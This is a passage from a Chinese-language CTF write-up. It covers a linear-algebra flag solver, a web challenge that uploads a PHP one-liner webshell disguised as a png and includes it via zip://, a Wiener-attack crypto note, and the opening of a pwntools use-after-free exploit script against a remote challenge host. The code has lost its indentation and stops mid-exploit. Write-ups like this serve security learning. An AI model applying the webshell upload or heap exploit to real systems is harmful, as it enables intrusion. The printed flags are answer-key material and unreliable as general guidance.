v13 ],[ 1259 , v4 ],[ 1237 , v14 ],[ 3863 , v20 ],[ 3163 , v19 ],[ 3259 , v10 ],[ 4357 ,
v23 ],[ 4229 , v7 ],[ 4447 , v21 ],[ 5501 , v15 ],[ 5569 , v22 ],[ 5323 , v12 ],[ 5503 ,
v24 ],[ 6763 , v16 ],[ 8597 , v6 ],[ 8053 , v17 ],[ 8831 , v9 ],[ 9067 , v3 ], 7434978],[[
1609 ,
v13 ],[ 1973 , v5 ],[ 2791 , v10 ],[ 2953 , v18 ],[ 4861 , v11 ],[ 4451 , v22 ],[ 6131 , v20 ],[ 6301 ,
v9 ],[ 6961 , v7 ],[ 7187 , v23 ],[ 6143 , v17 ],[ 7247 , v19 ],[ 7853 , v21 ],[ 8269 , v6 ],[ 8929 ,
v8 ],[ 7583 , v16 ],[ 8219 , v14 ],[ 8629 , v24 ],[ 9533 , v3 ],[ 8053 , v12 ],[ 911 , v15 ],[ 23 , v4 ],
11237050],[[
239 , v8 ],[ 937 , v7 ],[ 389 , v4 ],[ 1487 , v5 ],[ 1039 , v3 ],[ 3461 ,
v20 ],[ 2897 , v10 ],[ 3583 , v9 ],[ 4229 , v21 ],[ 3307 , v12 ],[ 5987 , v6 ],[ 7177 , v23 ],[ 7459 ,
v13 ],[ 6959 , v17 ],[ 8893 , v11 ],[ 7949 , v18 ],[ 7643 , v24 ],[ 8521 , v14 ],[ 9769 ,
v15 ],[ 9137 , v19 ],[ 9059 , v22 ],[ 9689 , v16 ], 10187010],[[
73 , v7 ],[ 139 , v14 ],[ 919 ,
v10 ],[ 1613 , v6 ],[ 2053 , v17 ],[ 2207 , v12 ],[ 5077 , v15 ],[ 5387 , v11 ],[ 4421 , v19 ],[ 5717 ,
v20 ],[ 6337 , v23 ],[ 6211 , v13 ],[ 6271 , v4 ],[ 8243 , v8 ],[ 7211 , v16 ],[ 7159 , v24 ],[ 8779 ,
v21 ],[ 7853 , v3 ],[ 9013 , v9 ],[ 8443 , v18 ],[ 9371 , v5 ],[ 8971 , v22 ], 10554112],[[
877 ,
v23 ],[ 797 , v9 ],[ 1613 , v5 ],[ 647 , v16 ],[ 1973 , v6 ],[ 1039 , v24 ],[ 2381 , v13 ],[ 3923 ,
v7 ],[ 3019 , v3 ],[ 3329 , v18 ],[ 4679 , v14 ],[ 5869 , v15 ],[ 6199 , v19 ],[ 7643 , v11 ],[ 7349 ,
v20 ],[ 7411 , v17 ],[ 8821 , v8 ],[ 7297 , v12 ],[ 8377 , v4 ],[ 8731 , v22 ],[ 4969 ,
v21
],[ 4969 , v10 ], 8442510],[[
271 , v7 ],[ 227 , v6 ],[ 683 , v20 ],[ 1259 , v11 ],[ 743 ,
v21 ],[ 1051 , v9 ],[ 991 , v18 ],[ 2473 , v23 ],[ 1361 , v12 ],[ 2621 , v17 ],[ 3673 , v13 ],[ 3089 ,
v3 ],[ 4679 , v15 ],[ 4519 , v24 ],[ 5701 , v10 ],[ 6079 , v22 ],[ 7159 , v5 ],[ 8161 , v8 ],[ 8311 ,
v14 ],[ 7877 , v16 ],[ 9859 , v4 ],[ 9949 , v19 ], 8293056],[[
457 , v20 ],[ 509 , v9 ],[ 2083 ,
v21 ],[ 2011 , v13 ],[ 1259 , v3 ],[ 1187 , v24 ],[ 2003 , v18 ],[ 4657 , v7 ],[ 3821 , v10 ],[ 4591 ,
v8 ],[ 4951 , v6 ],[ 4651 , v4 ],[ 4547 , v14 ],[ 4127 , v12 ],[ 4871 , v19 ],[ 5479 , v5 ],[ 4561 ,
v22 ],[ 6661 , v11 ],[ 6947 , v23 ],[ 7621 , v15 ],[ 5261 , v16
],[ 5261 , v17 ], 7391116],[[
241 ,
v21 ],[ 727 , v20 ],[ 1297 , v7 ],[ 1873 , v15 ],[ 937 , v19 ],[ 499 , v16 ],[ 2003 , v6 ],[ 2381 ,
v9 ],[ 3769 , v5 ],[ 4283 , v8 ],[ 4099 , v14 ],[ 4483 , v13 ],[ 4703 , v3 ],[ 4799 , v22 ],[ 6361 ,
v23 ],[ 7057 , v11 ],[ 5897 , v18 ],[ 5531 , v24 ],[ 7583 , v17 ],[ 8429 , v10 ],[ 9629 , v4 ],[ 9371 ,
v12 ], 8112200],[[
307 , v8 ],[ 151 , v5 ],[ 17 , v14 ],[ 19 , v22 ],[ 283 , v3 ],[ 2113 , v6 ],[ 2777 ,
v11 ],[ 853 , v24 ],[ 2411 , v20 ],[ 1543 , v16 ],[ 3559 , v23 ],[ 2897 , v21 ],[ 3851 , v9 ],[ 3529 ,
v18 ],[ 3833 , v19 ],[ 5591 , v4 ],[ 7229 , v7 ],[ 8563 , v15 ],[ 7757 , v12 ],[ 8243 , v17 ],[ 8831 ,
v13 ],[ 8963 , v10 ], 6896066],[[
4001 , v21 ],[ 479 , v12 ],[ 2083 , v6 ],[ 887 , v16 ],[ 2269 ,
v5 ],[ 2207 , v4 ],[ 2633 , v9 ],[ 3329 , v19 ],[ 3253 , v24 ],[ 5393 , v15 ],[ 4243 , v18 ],[ 5801 ,
v8 ],[ 7121 , v20 ],[ 6043 , v22 ],[ 6329 , v17 ],[ 7741 , v7 ],[ 8263 , v23 ],[ 7649 , v14 ],[ 9257 ,
v11 ],[ 9467 , v3 ],[ 349 , v10 ],[ 331 , v13 ], 8548252],[[
127 , v17 ],[ 1063 , v21 ],[ 1619 ,
v14 ],[ 2791 , v9 ],[ 3121 , v10 ],[ 2341 , v24 ],[ 4129 , v7 ],[ 4597 , v11 ],[ 5801 , v15 ],[ 4993 ,
v3 ],[ 6833 , v5 ],[ 7817 , v23 ],[ 6173 , v16 ],[ 7577 , v4 ],[ 8147 , v13 ],[ 8093 , v19 ],[ 8179 ,
v18 ],[ 9319 , v20 ],[ 9157 , v22 ],[ 8053 , v12 ],[ 661 , v6 ],[ 67 , v8 ], 9544120],[[
251 ,
v11 ],[ 887 , v23 ],[ 617 , v6 ],[ 523 , v22 ],[ 2887 , v15 ],[ 1493 , v3 ],[ 2521 , v14 ],[ 2437 ,
v16 ],[ 3301 , v10 ],[ 4457 , v20 ],[ 4219 , v9 ],[ 3203 , v12 ],[ 3907 , v19 ],[ 5557 , v7 ],[ 5653 ,
v18 ],[ 8387 , v8 ],[ 8443 , v13 ],[ 7883 , v17 ],[ 9091 , v21 ],[ 8101 , v24 ],[ 9137 , v4 ],[ 9787 ,
v5 ], 9670202],[[
1867 , v15 ],[ 683 , v22 ],[ 1187 , v16 ],[ 1801 , v14 ],[ 2251 , v4 ],[ 2347 ,
v19 ],[ 3019 , v21 ],[ 4153 , v6 ],[ 3541 , v17 ],[ 4813 , v20 ],[ 4999 , v8 ],[ 5669 , v9 ],[ 6869 ,
v23 ],[ 5527 , v18 ],[ 5051 , v24 ],[ 7949 , v11 ],[ 7019 , v12 ],[ 9067 , v5 ],[ 9343 , v10 ],[ 9467 ,
v3 ],[ 113 , v13 ],[ 557 , v7 ], 8485008],[[
281 , v23 ],[ 467 , v15 ],[ 449 , v8 ],[ 691 ,
v21 ],[ 443 , v17 ],[ 823 , v19 ],[ 2099 , v9 ],[ 1933 , v12 ],[ 2467 , v22 ],[ 3557 , v5 ],[ 4099 ,
v6 ],[ 3299 , v16 ],[ 3739 , v18 ],[ 5393 , v11 ],[ 5279 , v7 ],[ 4049 , v24 ],[ 7499 , v20 ],[ 6827 ,
v14 ],[ 7333 , v3 ],[ 8677 , v4 ],[ 8929 , v10 ],[ 9157 , v13 ], 8645980],[[
1063 , v16 ],[ 1187 ,
v12 ],[ 2551 , v19 ],[ 3187 , v22 ],[ 4943 , v11 ],[ 4651 , v13 ],[ 5651 , v7 ],[ 6199 , v23 ],[ 6359 ,
v15 ],[ 7691 , v8 ],[ 7649 , v20 ],[ 7963 , v6 ],[ 7541 , v17 ],[ 7489 , v3 ],[ 7433 , v24 ],[ 8537 ,
v10 ],[ 9011 , v14 ],[ 9769 , v5 ],[ 9187 , v18 ],[ 4001 , v21 ],[ 947 , v9 ],[ 739 , v4 ],
11454476],[[
1033 , v13 ],[ 1291 , v9 ],[ 1823 , v8 ],[ 2777 , v15 ],[ 2459 , v6 ],[ 1877 ,
v19 ],[ 3671 , v11 ],[ 2339 , v24 ],[ 5077 , v21 ],[ 6037 , v23 ],[ 4673 , v12 ],[ 5653 ,
v3 ],[ 6203 , v17 ],[ 7583 , v20 ],[ 6673 , v18 ],[ 8389 , v14 ],[ 9419 , v5 ],[ 9349 , v4 ],[ 8629 ,
v16 ],[ 9227 , v22 ],[ 2423 , v7 ],[ 2423 , v10 ], 9580734],[[
797 , v13 ],[ 1571 , v20 ],[ 1163 ,
v22 ],[ 3191 , v15 ],[ 1663 , v3 ],[ 3697 , v8 ],[ 3181 , v19 ],[ 3209 , v14 ],[ 3529 , v4 ],[ 3259 ,
v16 ],[ 4327 , v9 ],[ 4421 , v24 ],[ 5563 , v17 ],[ 5717 , v18 ],[ 6053 , v10 ],[ 6833 , v6 ],[ 7639 ,
v11 ],[ 6679 , v12 ],[ 9631 , v5 ],[ 751 , v21 ],[ 211 , v23 ],[ 17 , v7 ], 7325956],[[
41 , v7 ],[ 11 ,
v20 ],[ 1543 , v15 ],[ 1279 , v9 ],[ 2273 , v3 ],[ 2441 , v22 ],[ 4241 , v8 ],[ 4129 , v14 ],[ 4483 ,
v10 ],[ 4357 , v17 ],[ 6581 , v11 ],[ 5557 , v19 ],[ 6733 , v23 ],[ 5651 , v16 ],[ 7723 , v21 ],[ 6521 ,
v24 ],[ 7583 , v13 ],[ 8081 , v5 ],[ 6863 , v12 ],[ 9311 , v6 ],[ 9341 , v4 ],[ 9521 , v18 ],
10524420],[[
43 , v8 ],[ 241 , v4 ],[ 223 , v14 ],[ 1609 , v7 ],[ 2819 , v11 ],[ 1171 , v3 ],[ 2767 ,
v15 ],[ 3583 , v6 ],[ 3221 , v16 ],[ 4493 , v13 ],[ 3467 , v24 ],[ 3989 , v22 ],[ 6113 ,
v20 ],[ 5867 , v10 ],[ 5897 , v19 ],[ 6737 , v21 ],[ 5659 , v12 ],[ 6173 , v17 ],[ 6947 ,
v18 ],[ 9733 , v23 ],[ 9281 , v9 ],[ 9851 , v5 ], 8285986],[[
173 , v3 ],[ 83 , v24 ],[ 1723 ,
v8 ],[ 1213 , v10 ],[ 2731 , v11 ],[ 2099 , v4 ],[ 2657 , v9 ],[ 2953 , v5 ],[ 3329 , v21 ],[ 3169 ,
v17 ],[ 4987 , v7 ],[ 4637 , v14 ],[ 5003 , v18 ],[ 5407 , v16 ],[ 5843 , v22 ],[ 7243 , v6 ],[ 8017 ,
v23 ],[ 9203 , v15 ],[ 7507 , v12 ],[ 8681 , v19 ],[ 9721 , v13 ],[ 2 , v20 ], 8074995 ],[[
127 ,
v8 ],[ 419 , v21 ],[ 1613 , v13 ],[ 2927 , v7 ],[ 3343 , v15 ],[ 3559 , v20 ],[ 3109 , v4 ],[ 2617 ,
v16 ],[ 5171 , v11 ],[ 3907 , v12 ],[ 4567 , v14 ],[ 4783 , v10 ],[ 5233 , v9 ],[ 6067 , v23 ],[ 4481 ,
v24 ],[ 5119 , v3 ],[ 5387 , v17 ],[ 7993 , v6 ],[ 8369 , v5 ],[ 7829 , v19 ],[ 8713 , v18 ],[ 9931 ,
v22 ], 9064078 ]]
yuan = []
result = []
for i in range(0,len(input)):
output = [0 for k in range (0,22)]
line = input[i]
for j in range(0,22):
block = line[j]
#print block[0],block[1]
output[block[1]]=block[0]
print output
result.append(line[len(line)-1])
yuan.append(output)
for j in range(0,22):
print yuan[j]
print result[j]
yuan = np.array(yuan)
result = np.array(result)
jie = np.linalg.solve(yuan,result)
print jie
temp = [104,99,116,102,123,83,48,95,84,51,114,114,49,98,49,101,95,87,99,48,54,125]
flag = ""
for i in range(0,22):
flag += chr(temp[i])
print flag
7.Web-兵者多诡异
本地准备一个 show.php 里面写入自己的一句话，压缩为 zip 文件
然后改名为 png
上传后 发现 fp 参数是一个 包含 这里运用 zip://upload/xxx.jpg%23show
就包含到我们的 show.php 了
8.Crypto-Crypto So Interesting
t = invmod(u, phi_n)
e = pi_b(t)
生成 e，因此先求 e 模 bt 的逆元得到 t，然后 t 跟 n 用 Wiener Attack 得到 u，之后就可以得
到 phi_n，最后得到 d 解密。。。
9.Pwn-就是干
uaf 漏洞, 可以利用堆内存未初始化做 partial overwrite, 控制 rip 且绕过 pie, 后面的利用就
仁者见仁智者见智了。
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
from ctypes import *
import os, sys
import time
# switches
DEBUG = 1
LOCAL = 0
VERBOSE = 1
io = None
# modify this
def makeio():
global io
if LOCAL:
io = process('./fheap')
else:
io = remote('115.28.78.54',80)
return io
if VERBOSE: context(log_level='debug')
# define symbols and offsets here
# simplified r/s function
def ru(delim):
return io.recvuntil(delim)
def rn(count):
return io.recvn(count)
def ra(count):
# recv all
buf = ''
while count:
tmp = io.recvn(count)
buf += tmp
count -= len(tmp)
return buf
def sl(data):
return io.sendline(data)
def sn(data):
return io.send(data)
def info(string):
return log.info(string)
def dehex(s):
return s.replace(' ','').decode('hex')
def limu8(x):
return c_uint8(x).value
def limu16(x):
return c_uint16(x).value
def limu32(x):
return c_uint32(x).value
# define interactive functions here
def menu():
return ru('quit\n')
def create(size,con):
menu()
sl('create ')
ru('size:')
sl(str(size))
ru('str:')
sn(con)
return
def delete(index, rophelper=''):
menu()
sl('delete ')
ru('id:')
sl(str(index))
ru('?:')
if rophelper == '':
sn('yes'.ljust(0x100))
else: sn(rophelper.ljust(0x100))
return
def quit():
menu()
sl('quit ')
return
# define exploit function here
def pwn():
#if DEBUG: gdb.attach(io)
if not LOCAL:
# submit token
token = '33f7f88e95f8ed17631ed655513e2ac6GHrQhlnc'
ru('token: ')
sl(token)
pass
create(0x21, 0x20*'a'+'\x00')
create(0x21, 0x20*'a'+'\x00')